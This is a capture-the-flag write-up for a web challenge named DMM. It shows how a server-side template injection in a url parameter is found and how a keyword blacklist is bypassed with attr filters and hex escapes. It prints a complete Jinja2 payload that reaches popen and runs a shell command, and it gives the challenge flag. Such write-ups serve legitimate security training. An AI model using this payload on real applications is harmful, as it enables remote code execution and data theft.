DMM
===
**Category**: Web

**Points**: 487 (22 solves)

**Author**: Rosee
### Description
```
Please check it carefully
```
### Solution
- Enter `?url` by any parameters. it render my ouput => `ssti` and i can see domain with `ssti` lmaoo :)
- it have a blacklist, i find list black list ```config, request, __, [], join```
- bypass `_` with `attr`
- bypass `request, __,[],join` with hex `\x5f,\x5f\x5fgetitem\x5f\x5f`
- payload final : `{{(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat flag.txt').read()`
### Flag
- `darkCON{w0ww_y0u_ar3_sUp3er_h4ckeR_ggwpp_!!}`
